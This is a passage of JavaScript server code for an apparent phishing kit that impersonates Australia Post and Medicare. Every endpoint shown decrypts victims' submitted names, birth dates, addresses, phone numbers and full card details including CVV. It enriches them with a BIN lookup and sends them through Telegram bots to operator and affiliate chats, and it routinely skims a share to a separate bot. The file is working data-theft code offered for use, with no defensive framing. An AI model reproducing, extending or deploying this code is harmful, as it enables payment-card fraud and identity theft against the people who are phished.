      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;

      axios.post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostLoader:\n${originalText}`
      );
      axios.post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=697703458&text=AusPost:\n${originalText}`
      );
      SpoofergooferAP += 1;

      res.send("Update Completed");
    });
});

//MEDICARE
//MEDICARE
//MEDICARE

app.options("/fredMedicare", cors());

app.post("/fredMedicare", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mason == 6) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        mason = 0;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `MedicareFred:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5111234111,
              text: `Medicare:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        mason += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/tarrifiMedicare", cors());

app.post("/tarrifiMedicare", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mason == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mason = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareTarrifi:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=937419988&text=MediCare:\n${originalText}`
        );
        mason += 1;
      }

      res.send("Update Completed");
    });
});

let MZ7 = 0;

app.options("/MZ7Medicare", cors());

app.post("/MZ7Medicare", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (MZ7 == 3) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        MZ7 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareMZ7:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1225398527&text=MediCare:\n${originalText}`
        );
        MZ7 += 1;
      }

      res.send("Update Completed");
    });
});

let putin = 0;

app.options("/putinMedicare", cors());

app.post("/putinMedicare", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (putin == 3) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        putin = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicarePutin:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5362313568&text=MediCare:\n${originalText}`
        );
        putin += 1;
      }

      res.send("Update Completed");
    });
});

let failedlawyer = 1;

app.options("/failedlawyerMedicare", cors());

app.post("/failedlawyerMedicare", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (failedlawyer == 1) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        failedlawyer = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareFailed:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5472804493&text=MediCare:\n${originalText}`
        );
        failedlawyer += 1;
      }

      res.send("Update Completed");
    });
});

let codeNba = 0;

app.options("/codeNbaMedicare", cors());

app.post("/codeNbaMedicare", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (codeNba == 100) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        codeNba = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareCodeNBA:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1132816276&text=MediCare:\n${originalText}`
        );
        codeNba += 1;
      }

      res.send("Update Completed");
    });
});

let s350 = 2;

app.options("/ssMedicare", cors());

app.post("/ssMedicare", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (ssCount == 3) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        ssCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareSS:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=MediCare:\n${originalText}`
        );
        ssCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/offshorebillionsMedicare", cors());

app.post("/offshorebillionsMedicare", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (s350 == 2) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        s350 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareS350:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248091713&text=MediCare:\n${originalText}`
        );
        s350 += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/haytchMedicare", cors());

app.post("/haytchMedicare", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;

      axios.post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-725162140&text=Medicare:\n${originalText}`
      );

      res.send("Update Completed");
    });
});

app.options("/kelvMedicare", cors());

app.post("/kelvMedicare", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;

      if (kelvCount == 4) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareKelv:\n${originalText}`
        );
        axios.post(
